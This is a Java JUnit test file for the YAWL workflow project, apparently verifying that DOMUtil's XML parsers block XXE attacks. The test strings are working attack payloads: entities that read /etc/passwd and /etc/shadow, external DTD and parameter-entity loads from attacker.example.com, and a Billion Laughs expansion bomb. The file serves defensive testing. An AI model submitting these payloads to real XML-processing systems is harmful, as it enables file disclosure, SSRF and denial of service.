/*
 * Copyright (c) 2004-2026 The YAWL Foundation. All rights reserved.
 * The YAWL Foundation is a collaboration of individuals and
 * organisations who are committed to improving workflow technology.
 *
 * This file is part of YAWL. YAWL is free software: you can
 * redistribute it and/or modify it under the terms of the GNU Lesser
 * General Public License as published by the Free Software Foundation.
 *
 * YAWL is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General
 * Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with YAWL. If not, see <http://www.gnu.org/licenses/>.
 */

package org.yawlfoundation.yawl.util;

import junit.framework.Test;
import junit.framework.TestCase;
import junit.framework.TestSuite;
import junit.textui.TestRunner;
import org.w3c.dom.Document;
import org.xml.sax.SAXException;

import javax.xml.parsers.ParserConfigurationException;
import java.io.IOException;

/**
 * Integration tests verifying that DOMUtil's XXE (XML External Entity) injection
 * protections are correctly applied to all XML parser factory methods (SOC2 CC6.6).
 *
 * <p>Maps to SOC2 control: CC6.6 - Logical Access Controls / Input Validation.
 * XXE vulnerabilities allow attackers to read server-side files, perform SSRF
 * attacks, and cause denial-of-service via entity expansion bombs.
 *
 * <p>Chicago TDD: All tests use the real DOMUtil implementation without any mocks.
 * The four factory methods under test are:
 * <ol>
 *   <li>{@code getDocumentFromString()} - namespace-aware parser, from String</li>
 *   <li>{@code createDocumentInstance()} - namespace-aware empty document</li>
 *   <li>{@code createNamespacelessDocumentInstance()} - non-namespace-aware empty document</li>
 *   <li>{@code getNamespacelessDocumentFromString()} - non-namespace-aware parser, from String</li>
 * </ol>
 *
 * @author YAWL Foundation - SOC2 Compliance 2026-02-17
 */
public class TestDOMUtilXxeProtection extends TestCase {

    public TestDOMUtilXxeProtection(String name) {
        super(name);
    }

    // =========================================================================
    // CC6.6 - getDocumentFromString: DOCTYPE/SYSTEM entity attacks
    // =========================================================================

    /**
     * CC6.6: getDocumentFromString must reject DOCTYPE with SYSTEM entity pointing to
     * a local file. This is the classic XXE file-disclosure attack.
     * The 'disallow-doctype-decl' feature must cause parsing to throw.
     */
    public void testGetDocumentFromString_RejectsDocTypeWithSystemEntity()
            throws ParserConfigurationException {
        String xxePayload =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                "]>\n" +
                "<root><data>&xxe;</data></root>";

        try {
            DOMUtil.getDocumentFromString(xxePayload);
            fail("CC6.6 FAIL: getDocumentFromString must reject DOCTYPE SYSTEM entity " +
                 "(XXE file-disclosure attack was NOT blocked)");
        } catch (SAXException | IOException e) {
            // Expected: parser rejected the DOCTYPE declaration
            assertNotNull("Exception message must be present", e.getMessage());
        }
    }

    /**
     * CC6.6: getDocumentFromString must reject an external DTD reference via DOCTYPE SYSTEM.
     * External DTD loading enables SSRF and entity injection from a remote attacker server.
     */
    public void testGetDocumentFromString_RejectsExternalDtdReference()
            throws ParserConfigurationException {
        String xxePayload =
                "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE foo SYSTEM \"http://attacker.example.com/evil.dtd\">\n" +
                "<root/>";

        try {
            DOMUtil.getDocumentFromString(xxePayload);
            fail("CC6.6 FAIL: getDocumentFromString must reject external DTD references " +
                 "(SSRF via DOCTYPE SYSTEM was NOT blocked)");
        } catch (SAXException | IOException e) {
            assertNotNull("Exception message must be present", e.getMessage());
        }
    }

    /**
     * CC6.6: getDocumentFromString must reject DOCTYPE with a parameter entity that
     * references an external resource. This prevents indirect XXE via parameter entities.
     */
    public void testGetDocumentFromString_RejectsParameterEntityInjection()
            throws ParserConfigurationException {
        String xxePayload =
                "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "  <!ENTITY % xxe SYSTEM \"http://attacker.example.com/evil.dtd\">\n" +
                "  %xxe;\n" +
                "]>\n" +
                "<root/>";

        try {
            DOMUtil.getDocumentFromString(xxePayload);
            fail("CC6.6 FAIL: getDocumentFromString must reject parameter entity injection " +
                 "(indirect XXE via % entity was NOT blocked)");
        } catch (SAXException | IOException e) {
            assertNotNull("Exception message must be present", e.getMessage());
        }
    }

    /**
     * CC6.6: getDocumentFromString must reject the 'Billion Laughs' entity expansion attack.
     * This DoS attack uses nested entity references to create exponential memory consumption.
     * It must be blocked because the DOCTYPE declaration itself is disallowed.
     */
    public void testGetDocumentFromString_RejectsBillionLaughsAttack()
            throws ParserConfigurationException {
        // The 'Billion Laughs' DoS: each lolN expands the previous 10x
        String xxePayload =
                "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE lolz [\n" +
                "  <!ENTITY lol \"lol\">\n" +
                "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
                "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
                "  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
                "]>\n" +
                "<root>&lol4;</root>";

        try {
            DOMUtil.getDocumentFromString(xxePayload);
            fail("CC6.6 FAIL: getDocumentFromString must reject Billion Laughs attack " +
                 "(DoS via entity expansion was NOT blocked)");
        } catch (SAXException | IOException e) {
            assertNotNull("Exception message must be present", e.getMessage());
        }
    }

    /**
     * CC6.6: getDocumentFromString must successfully parse safe XML that contains
     * no DOCTYPE, no DTD references, and no external entities.
     */
    public void testGetDocumentFromString_ParsesSafeXmlSuccessfully()
            throws Exception {
        String safeXml =
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<specification id=\"test-spec\" version=\"1.0\">" +
                "  <name>YAWL Integration Test Specification</name>" +
                "  <task id=\"t1\"><label>Task One</label></task>" +
                "</specification>";

        Document doc = DOMUtil.getDocumentFromString(safeXml);

        assertNotNull("CC6.6: Safe XML must parse to a non-null Document", doc);
        assertEquals("CC6.6: Root element must be 'specification'",
                "specification", doc.getDocumentElement().getLocalName());
        assertNotNull("CC6.6: Child task element must be present",
                doc.getElementsByTagName("task").item(0));
    }

    /**
     * CC6.6: getDocumentFromString must successfully parse XML with namespaces.
     * Namespace-aware parsing must work correctly for YAWL schema documents.
     */
    public void testGetDocumentFromString_ParsesNamespacedXmlSuccessfully()
            throws Exception {
        String namespacedXml =
                "<yawl:specification xmlns:yawl=\"http://www.yawlfoundation.org/yawlschema\"" +
                " uri=\"test\" version=\"2.2\">" +
                "  <yawl:decomposition id=\"NetD1\" isRootNet=\"true\" xsi:type=\"NetFactsType\"" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" +
                "  </yawl:decomposition>" +
                "</yawl:specification>";

        Document doc = DOMUtil.getDocumentFromString(namespacedXml);

        assertNotNull("CC6.6: Namespace-aware parse must produce a non-null Document", doc);
        assertEquals("CC6.6: Local name of root must be 'specification'",
                "specification", doc.getDocumentElement().getLocalName());
    }

    // =========================================================================
    // CC6.6 - createDocumentInstance: empty namespace-aware document
    // =========================================================================

    /**
     * CC6.6: createDocumentInstance must return a non-null, namespace-aware Document.
     * The returned document must have been created through the secured factory.
     */
    public void testCreateDocumentInstance_ReturnsValidDocument()
            throws ParserConfigurationException {
        Document doc = DOMUtil.createDocumentInstance();

        assertNotNull("CC6.6: createDocumentInstance must return a non-null Document", doc);
        // A newly created document has no document element yet
        assertNull("CC6.6: Newly created document must have no root element yet",
                doc.getDocumentElement());
    }

    /**
     * CC6.6: createDocumentInstance must return a document that can accept
     * namespace-qualified elements - confirming namespace-aware factory is used.
     */
    public void testCreateDocumentInstance_SupportsNamespaceAwareElements()
            throws ParserConfigurationException {
        Document doc = DOMUtil.createDocumentInstance();
        assertNotNull("CC6.6: createDocumentInstance must return a non-null Document", doc);

        // Confirm namespace-aware element creation succeeds
        org.w3c.dom.Element elem = doc.createElementNS(
                "http://www.yawlfoundation.org/yawlschema", "yawl:specification");
        assertNotNull("CC6.6: Namespace-qualified element must be creatable", elem);
        assertEquals("CC6.6: Local name must be 'specification'",
                "specification", elem.getLocalName());
        assertEquals("CC6.6: Namespace URI must be set",
                "http://www.yawlfoundation.org/yawlschema", elem.getNamespaceURI());
    }

    // =========================================================================
    // CC6.6 - createNamespacelessDocumentInstance: empty non-namespace-aware document
    // =========================================================================

    /**
     * CC6.6: createNamespacelessDocumentInstance must return a non-null Document
     * that was created through the secured factory (no XXE risk at creation time).
     */
    public void testCreateNamespacelessDocumentInstance_ReturnsValidDocument()
            throws ParserConfigurationException {
        Document doc = DOMUtil.createNamespacelessDocumentInstance();

        assertNotNull("CC6.6: createNamespacelessDocumentInstance must return non-null", doc);
        assertNull("CC6.6: Newly created document must have no root element",
                doc.getDocumentElement());
    }

    // =========================================================================
    // CC6.6 - getNamespacelessDocumentFromString: DOCTYPE attacks
    // =========================================================================

    /**
     * CC6.6: getNamespacelessDocumentFromString must also reject DOCTYPE declarations.
     * The non-namespace-aware factory must apply the same XXE protections.
     */
    public void testGetNamespacelessDocumentFromString_RejectsDocTypeDeclaration()
            throws ParserConfigurationException {
        String xxePayload =
                "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]>\n" +
                "<root>&xxe;</root>";

        try {
            DOMUtil.getNamespacelessDocumentFromString(xxePayload);
            fail("CC6.6 FAIL: getNamespacelessDocumentFromString must reject DOCTYPE " +
                 "(namespaceless parser had XXE vulnerability NOT blocked)");
        } catch (SAXException | IOException e) {
            assertNotNull("Exception message must be present", e.getMessage());
        }
    }

    /**
     * CC6.6: getNamespacelessDocumentFromString must reject external DTD reference.
     * SSRF via DOCTYPE SYSTEM must be blocked in the namespaceless path too.
     */
    public void testGetNamespacelessDocumentFromString_RejectsExternalDtdReference()
            throws ParserConfigurationException {
        String xxePayload =
                "<?xml version=\"1.0\"?>\n" +
                "<!DOCTYPE foo SYSTEM \"http://attacker.example.com/attack.dtd\">\n" +
                "<data/>";

        try {
            DOMUtil.getNamespacelessDocumentFromString(xxePayload);
            fail("CC6.6 FAIL: getNamespacelessDocumentFromString must reject external DTD");
        } catch (SAXException | IOException e) {
            assertNotNull("Exception message must be present", e.getMessage());
        }
    }

    /**
     * CC6.6: getNamespacelessDocumentFromString must successfully parse safe XML
     * without namespaces - the common case for YAWL data payloads.
     */
    public void testGetNamespacelessDocumentFromString_ParsesSafeXmlSuccessfully()
            throws Exception {
        String safeXml =
                "<workItem>" +
                "  <id>case-1.task-A</id>" +
                "  <status>enabled</status>" +
                "  <data><amount>42</amount></data>" +
                "</workItem>";

        Document doc = DOMUtil.getNamespacelessDocumentFromString(safeXml);

        assertNotNull("CC6.6: Safe namespaceless XML must parse correctly", doc);
        assertEquals("CC6.6: Root element must be 'workItem'",
                "workItem", doc.getDocumentElement().getNodeName());
        assertNotNull("CC6.6: 'data' child element must be present",
                doc.getElementsByTagName("data").item(0));
    }

    // =========================================================================
    // CC6.6 - getNodeText: null safety (supporting method)
    // =========================================================================

    /**
     * CC6.6: getNodeText must return an empty string (not null) for a null node.
     * Null returns from parsed content handling could mask injection payloads.
     */
    public void testGetNodeText_NullNodeReturnsEmptyString() {
        String result = DOMUtil.getNodeText(null);
        assertNotNull("CC6.6: getNodeText(null) must not return null", result);
        assertEquals("CC6.6: getNodeText(null) must return empty string (length 0)",
                0, result.length());
    }

    /**
     * CC6.6: getNodeText must return correct text content for a simple element.
     * Verifies that safe XML content is accessible after secure parsing.
     */
    public void testGetNodeText_SimpleElementReturnsText() throws Exception {
        Document doc = DOMUtil.getDocumentFromString("<element>workflow-data</element>");
        String text = DOMUtil.getNodeText(doc.getDocumentElement());
        assertEquals("CC6.6: getNodeText must return element text content",
                "workflow-data", text);
    }

    // =========================================================================
    // Test Suite
    // =========================================================================

    public static Test suite() {
        TestSuite suite = new TestSuite("DOMUtil XXE Protection Tests (SOC2 CC6.6)");
        suite.addTestSuite(TestDOMUtilXxeProtection.class);
        return suite;
    }

    public static void main(String[] args) {
        TestRunner.run(suite());
    }
}
